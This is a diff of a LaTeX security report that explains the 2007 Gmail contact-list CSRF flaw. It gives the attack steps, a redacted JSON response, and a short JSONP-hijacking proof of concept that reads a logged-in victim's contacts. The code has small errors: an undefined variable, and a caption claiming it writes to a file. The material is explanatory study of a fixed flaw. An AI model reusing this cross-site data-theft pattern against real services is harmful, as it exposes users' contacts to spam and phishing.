@@ -315,21 +315,119 @@ References: (just letting them be here for the moment)
 [1 alt.] Infegy - Top 50 most popular brands. http://top50.infegy.com/. Accessed: 2015-11-24.
   
   \subsection{Contact list spoofing}
-  % TODO
-  \subsubsection{Description}
-  % TODO
+  It was around the beginning of 2007 that the public got information about CSRF attacks on Gmail. The CSRF 
+  attack involved theft of users' contact lists and it was hot news on the Internet as well as in papers. The 
+  aim of this attack was to gather email addresses that could be targeted by spam and phishing services.
+  Successfully stolen contact lists could not be detected by the users as the attackers did not actually steal
+  anything. The result was clueless users that didn't know if they were affected until their colleagues and 
+  friends started reporting about weird emails and spam issues.
+  
+  One have to realize that email spoofing exists even today. Large email services like Gmail and Outlook have
+  complex algorithms to tackle this problem to a certain extent. These algorithms were far as advanced in 2007 as 
+  they are today. Spamming was a troublesome problem and phishing was very efficient in fooling people, especially 
+  the older technology generation.
+  
+  The security around the contact list was breached because of negligence from the development team. Although
+  some of the attacks succeeded, Google could correct the problem rather quickly [2].
+  
+[2] O'Reilly - GMail CSRF flaw fixed. http://archive.oreilly.com/pub/post/gmail_exploit_contact_list_hij.html. Accessed: 2015-11-23.
+
   \subsubsection{Exploitation}
-  % TODO
+  The basics of a CSRF scenario applies here:
+  \begin{enumerate}
+   \item The victim authenticates to Gmail with his or her credentials. At that time there existed an auto login
+   that kept the cookie active, for almost an unlimited time, to any Google service.
+   \item (As most users were already logged in, they could simply browse the web right off the bat.)
+   \item The victim is browsing the web, accessing the attacker website. 
+   \item The attacker website answers with a page containing malicious HTML code with JavaScript.
+   \item Forged request is made, , calling the google function found in Picture 6. %%% <-- Has to be something dynamical
+   \item (Extra) Attacker receives object with email contacts. %% Maybe not useful
+  \end{enumerate}
+  
+  What made this possible was the server's verification scheme: it was only verifying that the caller was logged in 
+  to a Google account. The ever active cookie declared it without hesitation which led to a successful attack.
+  To make it even worse, the server didn't check if the call came from the same webpage[3]. A simple popup window could 
+  have triggered this attack.
+  
+  % Reference to code: 
+  % [3] http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/
+  % Accessed: 2015-11-26
+  % Alternative ref: 
+  % [4] http://ajaxian.com/archives/gmail-csrf-security-flaw
+  % Accessed: 2015-11-24
+  % It's neither of these sites code, it is Google's code. But we might have to quote it anyway.
+  \begin{figure}[h!t]
+  \begin{minted}[linenos]{JS} % JS = JavaScript
+  google ({
+  	Success: true,
+  	Errors: [],
+  	Body: {
+      AuthToken: {
+      	Value: '********'
+    },
+    Contacts: [
+      {
+        Id: '***',
+        Email: 'users at dwr.dev.java.net',
+        Affinity: ***,
+        Groups: [
+          {
+            id: '^Freq',
+            value: 'users at dwr.dev.java.net'
+          }
+        ],
+        Addressess: [],
+        Phoness: [],
+        Imss: []
+      },
+    // Lots more contacts here
+    ]
+  	}
+  })
+  \end{minted}
+  \caption{The JavaScript callback function that returned a data structure (object) with all email contacts.[2]}
+  \label{figure:signed_token_server}
+  \end{figure}
+  
+  As you can see in Picture 6, several fields were accessible. The affinity field told the attacker how important 
+  the contact was to that user, making it a more vulnerable target for phishing attempts[2]. 
+  
+  \begin{figure}[h!t]
+  \begin{minted}[linenos]{JS} % JS = JavaScript
+  <script type="text/javascript">
+	function google(data){
+      var emails, i;
+      for (i = 0; i < data.Body.Contacts.length; i++) {
+        mails += "<li>" + data.Body.Contacts[i].Email + "";
+      }
+      document.write("<ol>" + emails + "</ol>");
+	}
+  </script>
+ 
+  <script type="text/javascript" src="http://docs.google.com/data/contacts?out=js&show=ALL&psort=Affinity&callback=google&max=99999">
+  </script>
+  \end{minted}
+  \caption{A simple JavaScript that calls the function in Picture 6 and writes the received data to a file.}
+  \label{figure:signed_token_server}
+  \end{figure}
+  
+  The code in Picture 7 does a very basic operation. The attacker could as well send the data to another program 
+  that would for instance spam all contacts in the list or creating network connections for better relevance in 
+  phishing attempts.
+  
   \subsubsection{Impact}
-  % TODO
+  Starting a new service with problems is not a winning concept. Potential future users were thinking if Gmail 
+  really was the best choice, especially when Microsoft initiated Outlook 2007 set up for Hotmail accounts. 
+  But the final result was that it didn't have such a huge impact as Google managed to fix the problem relatively
+  quickly.
   
   
   \subsection{Email filter hijacking}
   % TODO
-  \subsubsection{Description}
-  % TODO
+  
   \subsubsection{Exploitation}
   % TODO
+  
   \subsubsection{Impact}
   % TODO
   
